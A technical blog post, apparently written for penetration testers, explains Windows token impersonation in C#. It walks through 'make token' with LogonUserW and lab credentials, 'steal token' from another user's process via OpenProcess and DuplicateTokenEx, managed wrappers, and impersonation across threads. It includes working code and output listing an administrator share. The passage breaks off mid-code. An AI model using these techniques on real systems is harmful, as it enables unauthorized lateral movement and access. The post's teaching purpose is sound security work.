---
title: Token Impersonation in C#
url: https://rastamouse.me/token-impersonation-in-csharp/
source: Rasta Mouse
date: 2022-12-17
fetch_date: 2025-10-04T01:49:25.137390
---

# Token Impersonation in C#

[Rasta Mouse](https://rastamouse.me)

* [Home](https://rastamouse.me/)

16 Dec 2022

4 min read

[c#](/tag/c/)

# Token Impersonation in C#

This post was inspired by a question posted by [kevin](https://twitter.com/GuhnooPlusLinux) in my [Discord](https://discord.gg/Whz3YtY4gG) server, about how token impersonation can be applied to threads in C#. Before delving into that particular facet, let’s do a quick recap of token impersonation as a whole.

## What is Token Impersonation?

This is a practice by which a calling thread can impersonate the security context of another user. This is used quite extensively in penetration testing et al to assume the identity of another user (useful for lateral movement, etc). The impersonation itself is achieved using the [ImpersonateLoggedOnUser](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser) API. As the documentation states, the user to impersonate is represented by a token handle, which can be obtained in a variety of ways.

The two most common methods are known colloquially as “make token” and “steal token” (popularised by the `make_token` and `steal_token` commands in [Cobalt Strike](https://www.cobaltstrike.com/)).

#### Make Token

This token is one we can make ourselves by passing the known plaintext credentials of a user to the [LogonUserW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw) API, usually with the `LOGON32_LOGON_NEW_CREDENTIALS` logon type. The resulting token has the same local identifier as the current user, but uses the alternate credentials when making network connections.

```
LogonUserW(
    "Administrator",    // username
    "LAB",              // domain
    "Passw0rd!",        // password
    LogonType.Logon32LogonNewCredentials,
    LogonProvider.Logon32ProviderWinnt50,
    out var hToken);
```

The resulting token, `hToken`, can then be passed to `ImpersonateLoggedOnUser`. We can prove it works by attempting to access a network resource before and after.

```
const string targetPath = @"\\WIN-UPVRP0CV3CV\c$";
IEnumerable<string> entries;

using var identity = WindowsIdentity.GetCurrent();
Console.Write($"Accessing share as {identity.Name}... ");

try
{
    // this will throw an unauthorized access exception
    entries = Directory.EnumerateFileSystemEntries(targetPath);
}
catch (UnauthorizedAccessException e)
{
    Console.WriteLine("Failed.");
    Console.WriteLine(e.Message);
    Console.WriteLine();
}

Console.Write(@"Making token for LAB\Administrator... ");

// make token
var success = LogonUserW(
    "Administrator",
    "LAB",
    "Passw0rd!",
    LogonType.Logon32LogonNewCredentials,
    LogonProvider.Logon32ProviderWinnt50,
    out var hToken);

if (success) Console.WriteLine("Success.");
else throw new Win32Exception(Marshal.GetLastWin32Error());

Console.Write(@"Impersonating token... ");

// impersonate token
success = ImpersonateLoggedOnUser(hToken);

if (success) Console.WriteLine("Success.");
else throw new Win32Exception(Marshal.GetLastWin32Error());

Console.WriteLine("Accessing share again:");
Console.WriteLine();

// list again and it should work
entries = Directory.EnumerateFileSystemEntries(targetPath);

foreach (var entry in entries)
    Console.WriteLine(entry);
```

```
Accessing share as LAB\rasta... Failed.
Access to the path '\\WIN-UPVRP0CV3CV\c$' is denied.

Making token for LAB\Administrator... Success.
Impersonating token... Success.
Accessing share again:

\\WIN-UPVRP0CV3CV\c$\$Recycle.Bin
\\WIN-UPVRP0CV3CV\c$\$WinREAgent
\\WIN-UPVRP0CV3CV\c$\artifacts
\\WIN-UPVRP0CV3CV\c$\Documents and Settings
\\WIN-UPVRP0CV3CV\c$\DumpStack.log.tmp
\\WIN-UPVRP0CV3CV\c$\pagefile.sys
\\WIN-UPVRP0CV3CV\c$\PerfLogs
\\WIN-UPVRP0CV3CV\c$\Program Files
\\WIN-UPVRP0CV3CV\c$\Program Files (x86)
\\WIN-UPVRP0CV3CV\c$\ProgramData
\\WIN-UPVRP0CV3CV\c$\Recovery
\\WIN-UPVRP0CV3CV\c$\System Volume Information
\\WIN-UPVRP0CV3CV\c$\Users
\\WIN-UPVRP0CV3CV\c$\Windows
```

#### Steal Token

Rather than making a token, we have the potential to “steal” one from a process already running on the local system. For instance, my user identity is `LAB\rasta` but the user `LAB\Administrator` is running a Notepad process.

![](https://i0.wp.com/rastamouse.me/wp-content/uploads/2022/12/notepad-1.png?resize=390%2C62&ssl=1)

These steps are slightly longer. We first call [OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) to obtain a handle to the target process. We need at least `PROCESS_QUERY_INFORMATION` and `PROCESS_DUP_HANDLE` privileges.

```
var hProcess = OpenProcess(
    ProcessAccess.QueryInformation | ProcessAccess.DuplicateHandle,
    false,
    3552);
```

Then use [OpenProcessToken](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken) to get a handle to the process primary access token with `TOKEN_DUPLICATE` and `TOKEN_IMPERSONATE` privileges.

```
OpenProcessToken(
    hProcess,
    TokenAccess.TokenDuplicate | TokenAccess.TokenImpersonate,
    out var hToken);
```

We then need to duplicate that token using [DuplicateTokenEx](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex), with an ImpersonationLevel of `SecurityImpersonation` and a TokenType of `TokenImpersonation`.

```
DuplicateTokenEx(
    hToken,
    TokenAccess.TokenAllAccess,
    IntPtr.Zero,
    SecurityImpersonationLevel.SecurityImpersonation,
    TokenType.TokenImpersonation,
    out var hTokenDup);
```

This final `hTokenDup` is the one that we could now pass to `ImpersonateLoggedOnUser`. I won’t provide another full code example as above, but trust me, it works 🙂

## Alternate Impersonation Methods

If you didn’t know, a great deal of the .NET runtime is actually built on top of native APIs. For example, if you did `Process.GetProcessById(3552).Handle;` the runtime will call `OpenProcess` from the `Microsoft.Win32.NativeMethods` namespace.

There are also some managed wrappers around `ImpersonateLoggedOnUser` which exists in the `System.Security.Principal.Win32` namespace. The two that I’m going to cover here are exposed via the `WindowsIdentity` class.

### RunImpersonated

The `WindowsIdentity` class has a static method called `RunImpersonated`, which takes a `SafeAccessTokenHandle` and an `Action`. This provides a very simple method of automatically impersonating the given token and executing a pre-defined routine.

```
WindowsIdentity.RunImpersonated(new SafeAccessTokenHandle(hToken), DoWorkAsUser);

private static void DoWorkAsUser()
{
    var entries = Directory.EnumerateFileSystemEntries(targetPath);

    foreach (var entry in entries)
        Console.WriteLine(entry);
}
```

## ImpersonationContext

`WindowsIdentity.Impersonate` provides a disposable context called a `WindowsImpersonationContext`. This method will also impersonate the given token and any work executed within the scope of this context will be as the impersonated user.

```
using var context = WindowsIdentity.Impersonate(hTokenDup);
DoWorkAsUser();
```

## Threads

The original question posed by kevin was how to combine impersonation with new threads. The issue with threads can be demonstrated quite simply:

```
LogonUserW(
    "Administrator",
    "LAB",
    "Passw0rd!",
    LogonType.Logon32LogonNewCredentials,
    LogonProvider.Logon32ProviderWinnt50,
    out var hToken);

ImpersonateLoggedOnUser(hToken);

var thread = new Thread(DoWorkAsUser);
thread.Start();
```

The above code will throw an `UnauthorizedAccessException` because the new thread will not inherit the impersonated token. This is expected given that the documentation for `ImpersonateLoggedOnUser` specifies that only the “calling thread” will impersonate the token.

The `WindowsImpersonationContext` is probably the easiest means of cascading an impersonation token to a new thread:

```
LogonUserW(
    "Adminis...